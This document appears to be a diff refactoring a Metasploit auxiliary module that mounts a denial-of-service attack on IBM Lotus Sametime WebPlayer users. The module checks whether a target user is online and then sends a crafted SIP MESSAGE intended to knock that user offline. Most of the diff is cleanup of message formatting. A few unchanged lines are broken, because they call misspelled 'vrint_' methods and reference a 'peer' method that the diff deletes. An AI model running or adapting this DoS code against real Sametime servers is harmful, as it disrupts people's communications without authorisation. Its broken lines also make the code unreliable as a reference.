@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
@@ -62,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
           '<target_email_address>@<sametime_media_server_FQDN>'
         ]),
         OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
-      ], self.class)
+      ])
 
   end
 
@@ -81,43 +78,39 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     # inform user of action currently selected
-    print_status("#{peer} - Action: #{action.name} selected")
+    print_status("Action: #{action.name} selected")
 
     # CHECK action
     if action.name == 'CHECK'
-      print_status("#{peer} - Checking if user #{@sipuri} is online")
+      print_status("Checking if user #{@sipuri} is online")
       if check_user
-        print_good("#{peer} - User online")
+        print_good("User online")
       else
-        print_status("#{peer} - User offline")
+        print_status("User offline")
       end
       return
     end
 
     # DOS action
-    print_status("#{peer} - Checking if user #{@sipuri} is online")
+    print_status("Checking if user #{@sipuri} is online")
     check_result = check_user
 
     if check_result == false
-      print_error("#{peer} - User is already offline... Exiting...")
+      print_error("User is already offline... Exiting...")
       return
     end
 
     # only proceed if action is DOS the target user is
     # online or the CHECKUSER option has been disabled
-    print_status("#{peer} - Targeting user: #{@sipuri}...")
+    print_status("Targeting user: #{@sipuri}...")
     dos_result = dos_user
 
     if dos_result
-      print_good("#{peer} - User is offline, DoS was successful")
+      print_good("User is offline, DoS was successful")
     else
-      print_error("#{peer} - User is still online")
+      print_error("User is still online")
     end
 
-  end
-
-  def peer
-    "#{rhost}:#{rport}"
   end
 
   def dos_user
@@ -126,22 +119,22 @@ class Metasploit3 < Msf::Auxiliary
     res = send_msg(msg)
 
     if res.nil?
-      vprint_good("#{peer} - User #{@sipuri} is no responding")
+      vprint_good("User #{@sipuri} is no responding")
       return true
     elsif res =~ /430 Flow Failed/i
-      vprint_good("#{peer} - DoS packet successful. Response received (430 Flow Failed)")
-      vprint_good("#{peer} - User #{@sipuri} is no longer responding")
+      vprint_good("DoS packet successful. Response received (430 Flow Failed)")
+      vprint_good("User #{@sipuri} is no longer responding")
       return true
     elsif res =~ /404 Not Found/i
-      vprint_error("#{peer} - DoS packet appears successful. Response received (404 Not Found)")
-      vprint_status("#{peer} - User appears to be currently offline or not in a Sametime video session")
+      vprint_error("DoS packet appears successful. Response received (404 Not Found)")
+      vprint_status("User appears to be currently offline or not in a Sametime video session")
       return true
     elsif res =~ /200 OK/i
       vrint_error("#{peer} - DoS packet unsuccessful. Response received (200)")
       vrint_status("#{peer} - Check user is running an effected version of IBM Lotus Sametime WebPlayer")
       return false
     else
-      vprint_status("#{peer} - Unexpected response")
+      vprint_status("Unexpected response")
       return true
     end
   end
@@ -154,26 +147,26 @@ class Metasploit3 < Msf::Auxiliary
 
     # check response for current user status - common return codes
     if res.nil?
-      vprint_error("#{peer} - No response")
+      vprint_error("No response")
       return false
     elsif res =~ /430 Flow Failed/i
-      vprint_good("#{peer} - User #{@sipuri} is no longer responding (already DoS'd?)")
+      vprint_good("User #{@sipuri} is no longer responding (already DoS'd?)")
       return false
     elsif res =~ /404 Not Found/i
-      vprint_error("#{peer} - User #{@sipuri} is currently offline or not in a Sametime video session")
+      vprint_error("User #{@sipuri} is currently offline or not in a Sametime video session")
       return false
     elsif res =~ /200 OK/i
-      vprint_good("#{peer} - User #{@sipuri} is online")
+      vprint_good("User #{@sipuri} is online")
       return true
     else
-      vprint_error("#{peer} - Unknown server response")
+      vprint_error("Unknown server response")
       return false
     end
   end
 
   def create_message(length)
     # create SIP MESSAGE of specified length
-    vprint_status("#{peer} - Creating SIP MESSAGE packet #{length} bytes long")
+    vprint_status("Creating SIP MESSAGE packet #{length} bytes long")
 
     source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)
     source_host = Rex::Socket.source_address(datastore['RHOST'])
@@ -219,13 +212,13 @@ class Metasploit3 < Msf::Auxiliary
       end
       return res
     rescue ::Rex::ConnectionRefused
-      print_status("#{peer} - Unable to connect")
+      print_status("Unable to connect")
       return nil
     rescue ::Errno::ECONNRESET
-      print_status("#{peer} - DoS packet successful, host not responding.")
+      print_good("DoS packet successful, host not responding.")
       return nil
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      print_status("#{peer} - Couldn't connect")
+      print_status("Couldn't connect")
       return nil
     ensure
       # disconnect socket if still open
